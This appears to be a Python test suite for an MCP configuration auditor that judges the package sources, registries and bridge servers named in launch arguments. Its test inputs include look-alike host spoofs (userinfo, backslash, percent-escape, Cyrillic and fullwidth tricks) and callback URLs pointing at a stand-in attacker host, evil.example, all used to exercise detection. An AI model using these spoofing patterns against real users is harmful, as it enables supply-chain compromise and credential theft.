"""Where a launch gets its code from (Round 2 #4).

`uvx --from git+https://github.com/oraios/serena`, `npx --registry=URL pkg` and
`npx mcp-remote https://vendor.example/sse` are how MCP servers are installed
and reached, and every one of them was CRITICAL because a URL in a launch
argument is a remote endpoint. Each is now judged as what it is - a package
source (by its pin), a registry, the server a bridge connects to - and only
when its URL cannot be anything else: one host, spelled out, the same to every
URL parser, and for a source a git forge. A look-alike host, a userinfo, a
backslash or a percent escape sends the URL back to the scan for endpoints,
which is critical, exactly as before.
"""

import os
import tempfile
import time
import unittest
import unittest.mock

from mcp_audit import detectors

from _support import isolated_machine, run_all_formats, write_json

SHA = "0123456789abcdef0123456789abcdef01234567"
#: The checks this file is about; others (floating-version...) are not.
JUDGED = {"git-source", "package-registry", "remote-server",
          "exfiltration-endpoint", "unparseable-url"}


def audit(command, *args, env=None, allow=()):
    cfg = {"command": command, "args": list(args)}
    if env is not None:
        cfg["env"] = env
    found = detectors.audit_server("s", cfg, [], allow)
    # a detector that crashed is a failure here, not a finding to filter out
    crashed = [f for f in found if f["check"] == "detector-error"]
    assert not crashed, crashed
    return [f for f in found if f["check"] in JUDGED]


def verdict(findings):
    return sorted((f["severity"], f["check"]) for f in findings)


def text(findings):
    return " | ".join(f["message"] for f in findings)


def fullwidth(word):
    """`word` in fullwidth letters: IDNA reads them as the ASCII ones."""
    return "".join(chr(ord(c) + 0xFEE0) for c in word)


class TestGitSources(unittest.TestCase):
    """A package installed from a git forge is judged by what it is pinned
    to, not as a remote endpoint."""

    PINS = (  # label, command, args, severity, what the message says
        ("uvx --from", "uvx", ["--from", "git+https://github.com/o/r", "tool"],
         "medium", "no commit or tag pinned"),
        ("uvx --from commit", "uvx",
         ["--from", "git+https://github.com/o/r@" + SHA, "tool"],
         "low", "pinned to a commit"),
        ("uvx --from short commit", "uvx",
         ["--from", "git+https://github.com/o/r@abc1234", "tool"],
         "low", "pinned to a commit"),
        ("uvx --from tag", "uvx",
         ["--from", "git+https://github.com/o/r.git@v1.2.3", "tool"],
         "low", "pinned to a tag"),
        ("uvx --from branch", "uvx",
         ["--from", "git+https://github.com/o/r@main", "tool"],
         "medium", "pinned to a branch"),
        ("uvx --from major tag", "uvx",
         ["--from", "git+https://github.com/o/r@v1", "tool"],
         "medium", "pinned to a branch"),
        ("uvx --from refs/heads", "uvx",
         ["--from", "git+https://github.com/o/r@refs/heads/main", "tool"],
         "medium", "pinned to a branch"),
        ("uvx positional", "uvx", ["git+https://github.com/o/r"],
         "medium", "no commit or tag pinned"),
        ("uvx positional commit", "uvx", ["git+https://github.com/o/r@" + SHA],
         "low", "pinned to a commit"),
        ("uvx --with", "uvx",
         ["--with", "git+https://github.com/o/r", "pkg==1.0.0"],
         "medium", "no commit or tag pinned"),
        ("uv tool run", "uv",
         ["tool", "run", "--from", "git+https://github.com/o/r", "tool"],
         "medium", "no commit or tag pinned"),
        ("pipx run --spec", "pipx",
         ["run", "--spec", "git+https://github.com/o/r", "tool"],
         "medium", "no commit or tag pinned"),
        ("pip fragment", "uvx",
         ["--from", "git+https://github.com/o/r#subdirectory=sub", "tool"],
         "medium", "no commit or tag pinned"),
        ("pip commit and egg", "uvx",
         ["--from", "git+https://github.com/o/r@" + SHA + "#egg=x", "tool"],
         "low", "pinned to a commit"),
        ("npx github:", "npx", ["-y", "github:o/r"],
         "medium", "no commit or tag pinned"),
        ("npx github: commit", "npx", ["-y", "github:o/r#" + SHA],
         "low", "pinned to a commit"),
        ("npx gitlab: tag", "npx", ["-y", "gitlab:o/r#v1.2.3"],
         "low", "pinned to a tag"),
        ("npx bitbucket:", "npx", ["-y", "bitbucket:o/r"],
         "medium", "no commit or tag pinned"),
        ("npx github: branch", "npx", ["-y", "github:o/r#main"],
         "medium", "pinned to a branch"),
        ("npx github: range", "npx", ["-y", "github:o/r#semver:^1.0.0"],
         "medium", "pinned to a branch or a range"),
        ("npx git+https commit", "npx",
         ["-y", "git+https://github.com/o/r.git#" + SHA],
         "low", "pinned to a commit"),
        ("npx -p", "npx", ["-p", "git+https://gitlab.com/o/r.git", "tool"],
         "medium", "no commit or tag pinned"),
        ("npx --package=", "npx",
         ["--package=git+https://gitlab.com/o/r.git", "tool"],
         "medium", "no commit or tag pinned"),
        ("pnpm dlx", "pnpm", ["dlx", "github:o/r"],
         "medium", "no commit or tag pinned"),
        ("bunx", "bunx", ["github:o/r"], "medium", "no commit or tag pinned"),
        ("yarn dlx", "yarn", ["dlx", "github:o/r"],
         "medium", "no commit or tag pinned"),
        ("npm exec", "npm", ["exec", "github:o/r"],
         "medium", "no commit or tag pinned"),
        ("cmd /c", "cmd", ["/c", "npx", "-y", "github:o/r"],
         "medium", "no commit or tag pinned"),
        ("bash -lc", "bash", ["-lc", "npx -y github:o/r"],
         "medium", "no commit or tag pinned"),
        ("codeberg", "uvx", ["--from", "git+https://codeberg.org/o/r", "t"],
         "medium", "no commit or tag pinned"),
        ("bitbucket over https", "uvx",
         ["--from", "git+https://bitbucket.org/o/r", "t"],
         "medium", "no commit or tag pinned"),
        ("upper case host and scheme", "uvx",
         ["--from", "GIT+HTTPS://GitHub.COM/o/r", "t"],
         "medium", "no commit or tag pinned"),
        ("the userinfo is not a ref", "uvx",
         ["--from", "git+https://user:FAKE-roles0005@github.com/o/r", "t"],
         "medium", "no commit or tag pinned"),
        ("the ref follows the last @", "uvx",
         ["--from", "git+https://github.com/o/r@feat@v1.2.3", "t"],
         "low", "pinned to a tag"),
        ("npx GitHub: in capitals", "npx", ["-y", "GitHub:o/r"],
         "medium", "no commit or tag pinned"),
    )

    def test_a_source_on_a_forge_is_judged_by_its_pin(self):
        for label, command, args, severity, phrase in self.PINS:
            with self.subTest(label):
                found = audit(command, *args)
                self.assertEqual(verdict(found), [(severity, "git-source")],
                                 found)
                self.assertIn(phrase, found[0]["message"])

    def test_the_advice_is_to_pin_a_commit_unless_it_is_one(self):
        (loose,) = audit("uvx", "--from", "git+https://github.com/o/r", "t")
        (tag,) = audit("uvx", "--from", "git+https://github.com/o/r@v1.0.0",
                       "t")
        (sha,) = audit("uvx", "--from", "git+https://github.com/o/r@" + SHA,
                       "t")
        self.assertIn("pin it to a commit", loose["message"])
        self.assertIn("pin it to a commit", tag["message"])
        self.assertNotIn("pin it to a commit", sha["message"])

    def test_the_message_names_the_forge_and_nothing_after_it(self):
        (f,) = audit("uvx", "--from",
                     "git+https://user:FAKE-roles0001@github.com/o/secret-repo"
                     "?token=FAKE-roles0002", "t")
        self.assertIn("https://github.com/...", f["message"])
        for leaked in ("FAKE-roles0001", "FAKE-roles0002", "secret-repo",
                       "user:"):
            self.assertNotIn(leaked, f["message"])

    def test_a_source_outside_the_forges_is_an_endpoint(self):
        for spec in ("git+https://git.corp.example/o/r",
                     "git+http://github.com/o/r",
                     "git+https://203.0.113.9/o/r",
                     "git+https://192.168.1.5/o/r"):
            with self.subTest(spec):
                found = audit("uvx", "--from", spec, "t")
                self.assertEqual(verdict(found),
                                 [("critical", "exfiltration-endpoint")])

    def test_a_forge_of_your_own_is_judged_like_the_others(self):
        spec = "git+https://git.corp.example/team/tool"
        (f,) = audit("uvx", "--from", spec, "t", allow=("git.corp.example",))
        self.assertEqual((f["severity"], f["check"]), ("medium", "git-source"))
        (f,) = audit("uvx", "--from", spec + "@" + SHA, "t",
                     allow=(".corp.example",))
        self.assertEqual((f["severity"], f["check"]), ("low", "git-source"))
        # ... but only over https: the code itself would be open to change
        found = audit("uvx", "--from", "git+http://git.corp.example/o/r", "t",
                      allow=("git.corp.example",))
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])

    def test_ssh_and_file_sources_have_no_url_to_judge(self):
        for spec in ("git+ssh://git@github.com/o/r", "git+file:///srv/r"):
            self.assertEqual(audit("uvx", "--from", spec, "t"), [], spec)

    def test_github_colon_is_npm_shorthand_and_not_a_python_one(self):
        self.assertEqual(audit("uvx", "--from", "github:o/r", "t"), [])
        self.assertEqual(audit("pipx", "run", "--spec", "github:o/r", "t"), [])


class TestRegistries(unittest.TestCase):
    """A registry flag says where every package comes from."""

    DEFAULT = ("https://registry.npmjs.org/", "https://pypi.org/simple",
               "https://files.pythonhosted.org/simple",
               "https://registry.yarnpkg.com/", "HTTPS://Registry.NpmJS.org/",
               "http://localhost:4873/", "http://127.0.0.1:8080/simple")

    def forms(self, url):
        """label -> (command, args, env) that pass `url` as a registry."""
        return {
            "npx --registry": ("npx", ["--registry", url, "-y", "p@1.0.0"], None),
            "npx --registry=": ("npx", ["--registry=" + url, "-y", "p@1.0.0"],
                                None),
            "npx scoped": ("npx", ["--@acme:registry=" + url, "-y",
                                   "@acme/p@1.0.0"], None),
            "bunx --registry": ("bunx", ["--registry", url, "p@1.0.0"], None),
            "pnpm dlx --registry": ("pnpm", ["dlx", "--registry", url,
                                             "p@1.0.0"], None),
            "uvx --index-url": ("uvx", ["--index-url", url, "p==1.0.0"], None),
            "uvx --index-url=": ("uvx", ["--index-url=" + url, "p==1.0.0"],
                                 None),
            "uvx -i": ("uvx", ["-i", url, "p==1.0.0"], None),
            "uvx --default-index": ("uvx", ["--default-index", url,
                                            "p==1.0.0"], None),
            "uvx --extra-index-url": ("uvx", ["--extra-index-url", url,
                                              "p==1.0.0"], None),
            "uvx --index": ("uvx", ["--index", url, "p==1.0.0"], None),
            "uvx --find-links": ("uvx", ["--find-links", url, "p==1.0.0"],
                                 None),
            "uvx -f": ("uvx", ["-f", url, "p==1.0.0"], None),
            "uv tool run": ("uv", ["tool", "run", "--index-url", url,
                                   "p==1.0.0"], None),
            "cmd /c npx": ("cmd", ["/c", "npx", "--registry", url, "-y",
                                   "p@1.0.0"], None),
            "bash -lc": ("bash", ["-lc", "npx --registry " + url
                                  + " -y p@1.0.0"], None),
            "NPM_CONFIG_REGISTRY": ("npx", ["-y", "p@1.0.0"],
                                    {"NPM_CONFIG_REGISTRY": url}),
            "npm_config_registry": ("npx", ["-y", "p@1.0.0"],
                                    {"npm_config_registry": url}),
            "UV_INDEX_URL": ("uvx", ["p==1.0.0"], {"UV_INDEX_URL": url}),
            "UV_DEFAULT_INDEX": ("uvx", ["p==1.0.0"],
                                 {"UV_DEFAULT_INDEX": url}),
            "UV_EXTRA_INDEX_URL": ("uvx", ["p==1.0.0"],
                                   {"UV_EXTRA_INDEX_URL": url}),
            "PIP_INDEX_URL": ("uvx", ["p==1.0.0"], {"PIP_INDEX_URL": url}),
            "PIP_EXTRA_INDEX_URL": ("uvx", ["p==1.0.0"],
                                    {"PIP_EXTRA_INDEX_URL": url}),
            "YARN_NPM_REGISTRY_SERVER": ("npx", ["-y", "p@1.0.0"],
                                         {"YARN_NPM_REGISTRY_SERVER": url}),
        }

    def check(self, url, expected, allow=(), phrase=None):
        for label, (command, args, env) in self.forms(url).items():
            with self.subTest(label, url=url):
                found = audit(command, *args, env=env, allow=allow)
                self.assertEqual(verdict(found), expected, found)
                if phrase:
                    self.assertIn(phrase, found[0]["message"])

    def test_the_default_registries_and_a_local_one_are_not_reported(self):
        for url in self.DEFAULT:
            self.check(url, [])

    def test_another_registry_over_https_is_medium_and_says_why(self):
        self.check("https://npm.internal.example/",
                   [("medium", "package-registry")],
                   phrase="every package this server installs comes from "
                          "there")

    def test_the_message_says_how_to_trust_it(self):
        (f,) = audit("npx", "--registry=https://npm.internal.example/", "-y",
                     "p@1.0.0")
        self.assertIn("--allow-host", f["message"])
        self.assertIn("--registry", f["message"])
        self.assertIn("https://npm.internal.example/", f["message"])

    def test_a_registry_over_plain_http_is_high(self):
        for url in ("http://npm.internal.example/",
                    "http://registry.npmjs.org/",
                    "http://192.168.1.5:4873/",
                    "http://localhost.evil.example:4873/"):
            self.check(url, [("high", "package-registry")],
                       phrase="plain http")

    def test_a_registry_you_trust_is_not_reported_over_https(self):
        self.check("https://npm.internal.example/", [],
                   allow=("npm.internal.example",))
        self.check("https://npm.internal.example/", [],
                   allow=(".internal.example",))
        # plain http can be read and changed on the way, whoever runs it
        self.check("http://npm.internal.example/",
                   [("high", "package-registry")],
                   allow=("npm.internal.example",))
        # and trusting one host is not trusting another
        self.check("https://npm.other.example/",
                   [("medium", "package-registry")],
                   allow=("npm.internal.example",))

    def test_a_path_or_a_file_url_is_not_a_registry_url(self):
        for value in ("./vendor", "/srv/wheels", "file:///srv/npm"):
            self.assertEqual(audit("uvx", "--find-links", value, "p==1.0.0"),
                             [], value)

    def test_the_registry_flag_of_the_program_is_not_the_runners(self):
        # after the package, the arguments belong to the program it runs
        found = audit("npx", "-y", "p@1.0.0", "--registry",
                      "https://registry.npmjs.org/")
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])
        found = audit("uvx", "p==1.0.0", "--index-url",
                      "https://pypi.org/simple")
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])
        found = audit("node", "srv.js", "--registry",
                      "https://registry.npmjs.org/")
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])

    def test_a_registry_variable_is_one_only_by_its_name(self):
        found = audit("node", "srv.js", env={"MY_REGISTRY_URL":
                                             "https://registry.npmjs.org/"})
        self.assertEqual(verdict(found), [("medium", "exfiltration-endpoint")])


class TestBridges(unittest.TestCase):
    """`mcp-remote URL` connects a client to a remote MCP server: it is a
    `url` entry, which is medium, and not an exfiltration endpoint."""

    URL = "https://mcp.linear.app/sse"
    SERVER = [("medium", "remote-server")]

    def test_a_bridge_is_a_remote_server_like_a_url_entry(self):
        self.assertEqual(
            verdict(detectors.audit_server("s", {"url": self.URL}, [], ())),
            [("medium", "remote-server")])
        for label, command, args in (
                ("npx", "npx", ["-y", "mcp-remote@0.1.29", self.URL]),
                ("npx, unpinned", "npx", ["-y", "mcp-remote", self.URL]),
                ("bunx", "bunx", ["mcp-remote", self.URL]),
                ("pnpm dlx", "pnpm", ["dlx", "mcp-remote", self.URL]),
                ("uvx mcp-proxy", "uvx", ["mcp-proxy", self.URL]),
                ("mcp-remote itself", "mcp-remote", [self.URL]),
                ("mcp-proxy itself", "mcp-proxy", [self.URL]),
                ("supergateway --sse", "supergateway", ["--sse", self.URL]),
                ("supergateway --sse=", "supergateway",
                 ["--sse=" + self.URL]),
                ("supergateway --streamableHttp", "supergateway",
                 ["--streamableHttp", self.URL]),
                ("supergateway --streamableHttp=", "supergateway",
                 ["--streamableHttp=" + self.URL]),
                ("cmd /c", "cmd", ["/c", "npx", "-y", "mcp-remote", self.URL]),
                ("bash -lc", "bash", ["-lc", "npx -y mcp-remote " + self.URL]),
                ("with flags after", "npx",
                 ["-y", "mcp-remote", self.URL, "9696", "--header",
                  "Authorization: Bearer FAKE-roles0003", "--allow-http"]),
                ("wss", "npx", ["-y", "mcp-remote", "wss://x.example/ws"])):
            with self.subTest(label):
                found = audit(command, *args)
                self.assertEqual(verdict(found), self.SERVER, found)

    def test_the_message_names_the_bridge_and_the_host_only(self):
        (f,) = audit("npx", "-y", "mcp-remote", self.URL + "?k=FAKE-roles0004")
        self.assertIn("https://mcp.linear.app/...", f["message"])
        self.assertIn("reached through mcp-remote", f["message"])
        self.assertNotIn("FAKE-roles0004", f["message"])

    def test_a_local_server_is_not_reported(self):
        for url in ("http://localhost:3000/sse", "http://127.0.0.1:3000/sse",
                    "http://[::1]:3000/sse"):
            self.assertEqual(audit("npx", "-y", "mcp-remote", url,
                                   "--allow-http"), [], url)

    def test_a_server_you_trust_is_not_reported_over_https(self):
        self.assertEqual(audit("npx", "-y", "mcp-remote", self.URL,
                               allow=("mcp.linear.app",)), [])
        self.assertEqual(audit("npx", "-y", "mcp-remote", self.URL,
                               allow=(".linear.app",)), [])
        self.assertEqual(
            verdict(audit("npx", "-y", "mcp-remote",
                          "http://mcp.linear.app/sse",
                          allow=("mcp.linear.app",))), self.SERVER)

    def test_only_a_bridge_gets_this(self):
        for command, args in (
                ("npx", ["-y", "some-server@1.0.0", self.URL]),
                ("npx", ["-y", "mcp-remote-evil@1.0.0", self.URL]),
                ("npx", ["-y", "@evil/mcp-remote@1.0.0", self.URL]),
                ("node", ["srv.js", self.URL]),
                ("node", ["mcp-remote", self.URL])):
            with self.subTest(command=command, args=args):
                self.assertEqual(verdict(audit(command, *args)),
                                 [("critical", "exfiltration-endpoint")])

    def test_a_bridge_has_one_server_and_any_other_url_is_an_endpoint(self):
        found = audit("npx", "-y", "mcp-remote", self.URL, "--callback",
                      "https://evil.example/c")
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")]
                         + self.SERVER)
        (crit,) = [f for f in found if f["severity"] == "critical"]
        self.assertIn("evil.example", crit["message"])

    def test_the_option_that_names_the_server_wins_over_the_first_url(self):
        found = audit("supergateway", "--baseUrl", "https://public.example",
                      "--sse", self.URL)
        crit = [f for f in found if f["severity"] == "critical"]
        self.assertEqual(len(crit), 1)
        self.assertIn("public.example", crit[0]["message"])
        self.assertIn("mcp.linear.app", text(found))

    def test_an_environment_url_is_still_an_endpoint(self):
        found = audit("npx", "-y", "mcp-remote", self.URL,
                      env={"CALLBACK": "https://evil.example/"})
        self.assertEqual(verdict(found),
                         [("medium", "exfiltration-endpoint")] + self.SERVER)


class TestAnImpostorIsStillCritical(unittest.TestCase):
    """The Round-1 bypasses, in every place that now gets a verdict of its
    own: a host that only looks like the expected one is never excused."""

    def test_a_source_that_only_looks_like_a_forge(self):
        spoofs = (
            ("userinfo", "git+https://github.com@evil.example/o/r"),
            ("userinfo and password", "git+https://github.com:x@evil.example/o/r"),
            ("backslash after", "git+https://github.com\\@evil.example/o/r"),
            ("backslash before", "git+https://evil.example\\@github.com/o/r"),
            ("percent escape", "git+https://git%68ub.com/o/r"),
            ("escaped dot", "git+https://github%2ecom/o/r"),
            ("tab", "git+https://github.com\t.evil.example/o/r"),
            ("suffix", "git+https://github.com.evil.example/o/r"),
            ("prefix", "git+https://evilgithub.com/o/r"),
            ("subdomain", "git+https://sub.github.com/o/r"),
            ("cyrillic", "git+https://githu" + chr(0x432) + ".com/o/r"),
            # IDNA maps these to github.com, but the text does not spell it
            ("fullwidth", "git+https://" + fullwidth("github") + ".com/o/r"),
        )
        shapes = (lambda s: ("uvx", ["--from", s, "t"]),
                  lambda s: ("uvx", [s]),
                  lambda s: ("npx", ["-y", s]),
                  lambda s: ("npx", ["-p", s, "t"]))
        for label, spec in spoofs:
            for shape in shapes:
                command, args = shape(spec)
                with self.subTest(label, command=command):
                    found = audit(command, *args)
                    self.assertIn(("critical", "exfiltration-endpoint"),
                                  verdict(found), found)
                    self.assertFalse(
                        [f for f in found if f["check"] == "git-source"],
                        found)

    def test_a_backslash_or_an_escape_is_also_unparseable(self):
        for spec in ("git+https://evil.example\\@github.com/o/r",
                     "git+https://git%68ub.com/o/r"):
            found = audit("uvx", "--from", spec, "t")
            self.assertIn(("high", "unparseable-url"), verdict(found), spec)

    def test_a_source_is_only_a_source_where_the_runner_reads_one(self):
        url = "https://github.com/o/r"
        for command, args in (
                ("node", ["srv.js", url]),
                ("node", ["srv.js", "git+" + url]),
                ("uvx", ["pkg==1.0.0", url]),
                ("uvx", ["pkg==1.0.0", "--from", "git+" + url]),
                ("npx", ["-y", "pkg@1.0.0", "git+" + url]),
                ("npx", ["-y", url]),                  # a tarball, not git
                ("npx", ["-y", url + "/archive/main.tar.gz"])):
            with self.subTest(command=command, args=args):
                found = audit(command, *args)
                self.assertEqual(verdict(found),
                                 [("critical", "exfiltration-endpoint")])

    def test_a_registry_that_only_looks_like_the_default(self):
        for label, url, shown in (
                ("suffix", "https://registry.npmjs.org.evil.example/",
                 "registry.npmjs.org.evil.example"),
                ("prefix", "https://evilregistry.npmjs.org/",
                 "evilregistry.npmjs.org"),
                ("userinfo", "https://registry.npmjs.org@evil.example/",
                 "evil.example")):
            for flag in ("--registry", "--registry="):
                with self.subTest(label, flag=flag):
                    args = ([flag + url] if flag.endswith("=")
                            else [flag, url])
                    found = audit("npx", *args, "-y", "p@1.0.0")
                    self.assertEqual(verdict(found),
                                     [("medium", "package-registry")], found)
                    self.assertIn("https://" + shown + "/", found[0]["message"])
                    self.assertIn("other than the default", found[0]["message"])
        found = audit("uvx", "--index-url", "https://pypi.org.evil.example/s",
                      "p==1.0.0")
        self.assertEqual(verdict(found), [("medium", "package-registry")])

    def test_a_registry_host_the_text_does_not_spell_is_an_endpoint(self):
        url = "https://" + fullwidth("registry") + ".npmjs.org/"
        found = audit("npx", "--registry", url, "-y", "p@1.0.0")
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])

    def test_a_registry_url_that_is_not_http_is_an_endpoint(self):
        for url in ("wss://npm.internal.example/", "ws://localhost:4873/"):
            found = audit("npx", "--registry", url, "-y", "p@1.0.0")
            self.assertFalse([f for f in found
                              if f["check"] == "package-registry"], url)
        found = audit("npx", "--registry", "wss://npm.internal.example/",
                      "-y", "p@1.0.0")
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])

    def test_a_registry_whose_host_depends_on_the_parser(self):
        for url in ("https://registry.npmjs.org\\@evil.example/",
                    "https://registry.npmjs%2eorg/"):
            with self.subTest(url):
                found = audit("npx", "--registry", url, "-y", "p@1.0.0")
                self.assertIn(("critical", "exfiltration-endpoint"),
                              verdict(found))
                self.assertIn(("high", "unparseable-url"), verdict(found))
                self.assertFalse(
                    [f for f in found if f["check"] == "package-registry"])

    def test_a_bridge_url_that_only_looks_trusted(self):
        allow = ("mcp.linear.app",)
        # userinfo: the server is evil.example, so it is reported as one
        found = audit("npx", "-y", "mcp-remote",
                      "https://mcp.linear.app@evil.example/sse", allow=allow)
        self.assertEqual(verdict(found), [("medium", "remote-server")])
        self.assertIn("evil.example", found[0]["message"])
        self.assertNotIn("mcp.linear.app", found[0]["message"])
        # a suffix is another host
        found = audit("npx", "-y", "mcp-remote",
                      "https://mcp.linear.app.evil.example/sse", allow=allow)
        self.assertEqual(verdict(found), [("medium", "remote-server")])
        # a backslash makes the host depend on the parser
        found = audit("npx", "-y", "mcp-remote",
                      "https://evil.example\\@mcp.linear.app/sse", allow=allow)
        self.assertIn(("critical", "exfiltration-endpoint"), verdict(found))
        self.assertIn(("high", "unparseable-url"), verdict(found))
        self.assertFalse([f for f in found if f["check"] == "remote-server"])

    def test_a_bridge_host_the_text_does_not_spell_is_an_endpoint(self):
        url = "https://" + fullwidth("mcp") + ".linear.app/sse"
        found = audit("npx", "-y", "mcp-remote", url, allow=("mcp.linear.app",))
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])

    def test_a_trusted_url_does_not_excuse_a_longer_one_that_starts_alike(self):
        # The value that was judged is masked only where it stands as a whole
        # word. `https://registry.npmjs.org` is the start of this other URL
        # without being it.
        found = audit("npx", "--registry", "https://registry.npmjs.org", "-y",
                      "p@1.0.0", "https://registry.npmjs.org.evil.example/x")
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])
        self.assertIn("registry.npmjs.org.evil.example", found[0]["message"])
        # the same for a source: what follows the program is the program's
        found = audit("uvx", "--from", "git+https://github.com/o/r", "t",
                      "git+https://github.com/o/r/archive/x")
        self.assertIn(("critical", "exfiltration-endpoint"), verdict(found))

    def test_a_trusted_url_glued_to_a_word_is_not_set_aside(self):
        found = audit("npx", "--registry", "https://registry.npmjs.org/", "-y",
                      "p@1.0.0", "x-https://registry.npmjs.org/")
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])

    def test_a_value_the_text_does_not_spell_is_judged_as_the_text_reads(self):
        # The shell reads `"https://npm.internal.example"/` as one word, the
        # registry URL. The text has a quote in it, so the value is not found
        # in it as written: no verdict of its own, and the URL is an endpoint.
        found = audit("bash", "-c", 'npx --registry '
                      '"https://npm.internal.example"/ -y p@1.0.0')
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])

    def test_a_value_that_cannot_be_taken_apart_is_not_excused(self):
        for command, args in (
                ("npx", ["--registry", "http://[x", "-y", "p@1.0.0"]),
                ("uvx", ["--from", "git+https://[::1", "t"]),
                ("npx", ["-y", "mcp-remote@1.0.0", "https://[x"])):
            with self.subTest(command=command, args=args):
                self.assertEqual(verdict(audit(command, *args)),
                                 [("high", "unparseable-url")])

    def test_the_same_finding_is_not_repeated(self):
        found = audit("npx", "--registry", "https://npm.internal.example/",
                      "--registry", "https://npm.internal.example/", "-y",
                      "p@1.0.0")
        self.assertEqual(verdict(found), [("medium", "package-registry")])
        url = "https://mcp.vendor.example/sse"
        found = audit("npx", "-y", "mcp-remote@1.0.0", url,
                      env={"UPSTREAM": url})
        self.assertEqual(verdict(found), [("medium", "remote-server")])

    def test_what_is_set_aside_is_only_the_value_not_its_neighbours(self):
        script = ("npx --registry https://registry.npmjs.org/ -y p@1.0.0 "
                  "&& node x.js https://evil.example/c")
        found = audit("bash", "-c", script)
        self.assertEqual(verdict(found),
                         [("critical", "exfiltration-endpoint")])
        self.assertIn("evil.example", found[0]["message"])


class TestRolesAreBounded(unittest.TestCase):
    """A config with thousands of registry flags must not make the audit
    quadratic, and what is beyond the limit is not excused."""

    def test_only_a_few_values_get_a_verdict_of_their_own(self):
        n = 300
        args = []
        for i in range(n):
            args += ["--extra-index-url", "https://pypi.org/simple/%d" % i]
        real = detectors._mask
        with unittest.mock.patch.object(detectors, "_mask",
                                        side_effect=real) as mask:
            found = audit("uvx", *args, "p==1.0.0")
        self.assertLessEqual(mask.call_count, 64 * (2 * n + 3))
        # the first ones are the default registry, the rest are endpoints
        self.assertEqual(len(found), n - 64)
        self.assertEqual({(f["severity"], f["check"]) for f in found},
                         {("critical", "exfiltration-endpoint")})

    def test_the_same_value_repeated_is_one_value(self):
        args = []
        for _ in range(200):
            args += ["--extra-index-url", "https://pypi.org/simple"]
        self.assertEqual(audit("uvx", *args, "p==1.0.0"), [])

    def test_a_mask_sets_aside_a_whole_word_and_only_that(self):
        value = "https://r.example/sse"
        self.assertEqual(detectors._mask("a " + value + " b", value),
                         ("a   b", True))
        self.assertEqual(detectors._mask("--sse=" + value, value),
                         ("--sse= ", True))
        self.assertEqual(detectors._mask("'" + value + "'", value),
                         ("' '", True))
        self.assertEqual(detectors._mask(value + ".evil", value),
                         (value + ".evil", False))
        self.assertEqual(detectors._mask("x" + value, value),
                         ("x" + value, False))
        self.assertEqual(detectors._mask("", value), ("", False))
        self.assertEqual(detectors._mask("abc", ""), ("abc", False))

    def test_a_mask_is_linear_in_the_text(self):
        # A value that matches, shifted by one period, at every step: finding
        # the next place from the start of the last one is quadratic.
        period = "https://r.example/"
        start = time.perf_counter()
        detectors._mask(period * 100000, period * 50000)
        self.assertLess(time.perf_counter() - start, 2)


class TestNoCredentialIsPrinted(unittest.TestCase):
    """A registry, a repository or a bridge URL is where credentials live."""

    def test_nothing_after_the_host_reaches_any_output(self):
        secrets = ["FAKE-roles%04d" % n for n in range(10, 22)]
        s = iter(secrets)
        servers = {
            "git": {"command": "uvx", "args": [
                "--from", "git+https://u:%s@github.com/o/%s?t=%s"
                % (next(s), next(s), next(s)), "t"]},
            "npm-git": {"command": "npx", "args": [
                "-y", "git+https://%s:%s@gitlab.com/o/r.git#main" % (
                    next(s), next(s))]},
            "registry": {"command": "npx", "args": [
                "--registry=https://u:%s@npm.internal.example/%s/" % (
                    next(s), next(s)), "-y", "p@1.0.0"]},
            "env-registry": {"command": "uvx", "args": ["p==1.0.0"], "env": {
                "UV_INDEX_URL": "https://u:%s@pypi.internal.example/s" % next(s)}},
            "bridge": {"command": "npx", "args": [
                "-y", "mcp-remote@0.1.29",
                "https://mcp.vendor.example/%s/sse?key=%s" % (next(s),
                                                              next(s))]},
        }
        with isolated_machine():
            with tempfile.TemporaryDirectory() as tmp:
                path = write_json(os.path.join(tmp, "mcp.json"),
                                  {"mcpServers": servers})
                for fmt, (code, out, err) in run_all_formats(
                        "--config", path).items():
                    for leaked in secrets:
                        self.assertNotIn(leaked, out + err, fmt)
                    self.assertEqual(code, 0, fmt)
                    if fmt != "human":  # the human report names no check
                        for check in ("git-source", "package-registry",
                                      "remote-server"):
                            self.assertIn(check, out, (fmt, check))


if __name__ == "__main__":
    unittest.main()
